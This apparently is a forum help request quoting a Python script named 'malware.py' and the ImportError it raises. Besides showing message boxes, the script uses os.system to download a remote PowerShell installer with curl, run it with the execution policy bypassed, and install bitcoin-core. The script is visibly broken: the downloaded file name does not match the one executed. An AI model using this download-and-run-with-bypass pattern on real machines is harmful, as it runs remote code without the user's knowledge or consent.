import ctypes
ctypes.windll.user32.MessageBoxA(0, "Your text", "Your title", 1)
import os
os.system("""
@echo off
curl -o win-chocolatey-0.10.8.zip https://chocolatey.org/install.ps1
powershell -ExecutionPolicy ByPass -File install.ps1
choco install bitcoin-core
""")
import Tkinter, tkMessageBox
root = Tkinter.Tk()
root.withdraw()
tkMessageBox.showinfo("Title", "This is your message!")
</code>
This is the error I get:
<code>Traceback (most recent call last):
  File "C:\Users\name\Desktop\Malware\malware.py", line 1, in &lt;module&gt;
    import ctypes
  File "C:\Users\name\AppData\Local\Programs\Python\Python36-32\lib\ctypes\__init__.py", line 7, in &lt;module&gt;
    from _ctypes import Union, Structure, Array
ImportError
